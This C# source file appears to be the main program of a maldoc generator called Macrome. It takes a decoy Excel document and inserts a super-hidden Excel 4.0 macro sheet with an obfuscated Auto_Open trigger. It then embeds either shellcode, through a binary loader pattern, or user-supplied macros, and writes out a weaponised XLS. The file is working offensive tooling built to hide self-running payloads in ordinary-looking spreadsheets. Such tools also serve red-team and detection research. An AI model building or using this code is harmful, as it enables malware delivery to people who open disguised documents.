using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using b2xtranslator.Spreadsheet.XlsFileFormat;
using b2xtranslator.Spreadsheet.XlsFileFormat.Records;
using b2xtranslator.StructuredStorage.Reader;

namespace Macrome
{

    public class Program
    { 
        public static string AssemblyDirectory
        {
            get
            {
                string codeBase = Assembly.GetExecutingAssembly().CodeBase;
                UriBuilder uri = new UriBuilder(codeBase);
                string path = Uri.UnescapeDataString(uri.Path);
                return Path.GetDirectoryName(path);
            }
        }

        /// <summary>
        /// Generate an XLS 
        /// </summary>
        /// <param name="decoyDocument"></param>
        /// <param name="payload"></param>
        /// <param name="payloadType"></param>
        /// <param name="macroSheetName"></param>
        /// <param name="outputSheetName"></param>
        /// <param name="args"></param>
        public static void Main(FileInfo decoyDocument = null, FileInfo payload = null, PayloadType payloadType = PayloadType.Shellcode, 
                                string macroSheetName = "Sheet2", string outputSheetName = "output.xls", string[] args = null)
        {
            Encoding.RegisterProvider(CodePagesEncodingProvider.Instance);

            List<BiffRecord> defaultMacroSheetRecords = GetDefaultMacroSheetRecords();

            string decoyDocPath = decoyDocument.FullName;

            WorkbookStream wbs = LoadDecoyDocument(decoyDocPath);
            WorkbookEditor wbe = new WorkbookEditor(wbs);

            wbe.AddMacroSheet(defaultMacroSheetRecords, macroSheetName, BoundSheet8.HiddenState.SuperHidden);

            wbe.AddLabel("Auto_Open", 0, 0);

            List<string> macros = null;
            byte[] binaryPayload = null;

            switch (payloadType)
            {
                case PayloadType.Shellcode:
                    macros = MacroPatterns.GetBinaryLoaderPattern(macroSheetName);
                    binaryPayload = File.ReadAllBytes(payload.FullName);
                    break;
                case PayloadType.Macro:
                    macros = File.ReadAllLines(payload.FullName).ToList();
                    break;
                default:
                    throw new ArgumentException(string.Format("Invalid PayloadType {0}", payloadType), "payloadType");
            }

            wbe.SetMacroSheetContent(macros, binaryPayload);

            wbe.ObfuscateAutoOpen();

            ExcelDocWriter writer = new ExcelDocWriter();
            string outputPath = AssemblyDirectory + Path.DirectorySeparatorChar + outputSheetName;
            Console.WriteLine("Writing document to {0}", outputPath);
            writer.WriteDocument(outputPath, wbe.WbStream);
        }

        private static WorkbookStream LoadDecoyDocument(string decoyDocPath)
        {
            using (var fs = new FileStream(decoyDocPath, FileMode.Open))
            {
                StructuredStorageReader ssr = new StructuredStorageReader(fs);
                var wbStream = ssr.GetStream("Workbook");
                byte[] wbBytes = new byte[wbStream.Length];
                wbStream.Read(wbBytes, 0, wbBytes.Length, 0);
                WorkbookStream wbs = new WorkbookStream(wbBytes);
                return wbs;
            }
        }

        private static List<BiffRecord> GetDefaultMacroSheetRecords()
        {
            string defaultMacroPath = AssemblyDirectory + Path.DirectorySeparatorChar + @"default_macro_template.xls";
            using (var fs = new FileStream(defaultMacroPath, FileMode.Open))
            {
                StructuredStorageReader ssr = new StructuredStorageReader(fs);
                var wbStream = ssr.GetStream("Workbook");
                byte[] wbBytes = new byte[wbStream.Length];
                wbStream.Read(wbBytes, 0, wbBytes.Length, 0);
                WorkbookStream wbs = new WorkbookStream(wbBytes);
                //The last BOF/EOF set is our Macro sheet.
                List<BiffRecord> sheetRecords = wbs.GetRecordsForBOFRecord(wbs.GetAllRecordsByType<BOF>().Last());
                return sheetRecords;
            }

        }
    }
}
